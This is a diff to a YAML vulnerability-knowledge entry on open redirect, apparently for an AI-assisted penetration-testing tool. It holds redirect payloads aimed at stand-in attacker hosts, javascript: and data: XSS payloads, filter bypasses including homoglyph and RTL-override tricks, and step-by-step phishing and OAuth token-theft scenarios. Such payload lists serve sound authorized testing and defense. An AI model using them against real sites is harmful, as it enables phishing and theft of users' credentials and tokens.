@@ -1,31 +1,63 @@
 id: OPEN_REDIRECT
-name: Open Redirect
+name: Open Redirect — Comprehensive
 cwe:
 - CWE-601
 owasp: A01:2021 Broken Access Control
-severity_range: Low - Medium
-description: Application redirects users to URLs specified in parameters without validation, enabling phishing and OAuth token
-  theft.
+severity_range: Low - High
+description: Open redirect lets attackers send victims through a trusted domain to a malicious site. Used in phishing, OAuth
+  token theft, and credential harvesting. Severity rises sharply when chained with OAuth or SSO flows.
 detection:
-  payloads:
-  - https://evil.com
-  - //evil.com
-  - \\evil.com
-  - /\evil.com
-  - https://target.com@evil.com
-  - https://evil.com#target.com
-  - //evil%2Ecom
-  - https:evil.com
-  - http://evil.com%2f%2f.target.com
-  - ////evil.com
-  - https://evil.com/.target.com
   strategy:
-  - 1. Find redirect parameters (url=, next=, redirect=, return=, goto=, continue=, dest=)
-  - 2. Test with external URLs
-  - '3. Try bypasses: protocol-relative, backslash, URL encoding'
-  - 4. Check OAuth callbacks for redirect manipulation
-  - 5. Test login/logout redirect flows
-evidence_needed: Application redirects to attacker-controlled domain
+  - 1. Find redirect parameters (redirect, return, url, next, goto, returnTo, dest)
+  - 2. Set value to https://evil.com — check response Location header
+  - '3. Try bypasses: //evil.com, /\evil.com, https:evil.com, javascript:alert(1)'
+  - 4. Test in OAuth callback flows for token theft
+  payloads:
+  - https://attacker.com
+  - //attacker.com
+  - /\\attacker.com
+  - \\attacker.com
+  - javascript:alert(document.domain)
+  - data:text/html,<script>alert(1)</script>
+  - //attacker.com/.target.com
+  - https://target.com.attacker.com
+  - https://target.com@attacker.com
+  - https://target.com%2eattacker.com
+  - https://target.com%252eattacker.com
+  - https://attacker.com/target.com
+  - /.attacker.com
+  - '%252f%252fattacker.com'
+  - //google.com/%2f..
+exploitation:
+  phishing: Send https://trusted-bank.com/login?redirect=//evil.com to victim. They authenticate, get redirected to evil.com
+    clone, enter credentials again.
+  oauth_token_theft:
+  - Find OAuth flow with redirect_uri parameter
+  - If redirect_uri is loosely validated, set to attacker.com
+  - User authorizes, gets redirected to attacker.com#access_token=...
+  - Attacker captures token from URL fragment
+  saml_relay_state_abuse: Manipulate RelayState in SAML to redirect post-login to attacker site
+  chained_with_xss: 'Open redirect to data: URL with XSS payload'
+filter_bypasses:
+- 'Mixed case: HTTPS://attacker.com'
+- 'URL encoding: %68%74%74%70%73://attacker.com'
+- 'Double encoding: %2568%2574%2574%2570%253A//attacker.com'
+- 'Unicode: ‮target.com.attacker.com (RTL override)'
+- 'Backslash variants: /\attacker.com, /\\attacker.com'
+- '@ trick: https://target.com@attacker.com'
+- 'Null byte: https://target.com%00.attacker.com'
+- 'TLD swap: target.com.evil → register target.com.evil as subdomain of attacker'
+- 'Punycode: https://gооgle.com (Cyrillic ''o'')'
+ai_research_hints:
+- OAuth flows are highest-impact open redirect targets — token theft is critical
+- Logout endpoints often have unvalidated redirect parameters
+- Mobile app deep link handlers sometimes inherit URL validation flaws
+- Email confirmation links may have weakly-validated return URLs
+- POST-based redirects via 302 are often missed by scanners — test those too
+tools:
+- OpenRedireX
+- Burp Active Scan
+- OWASP ZAP redirect scanner
 references:
-- https://portswigger.net/web-security/open-redirect
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+- https://portswigger.net/kb/issues/00500100_open-redirection-reflected
+- https://book.hacktricks.xyz/pentesting-web/open-redirect
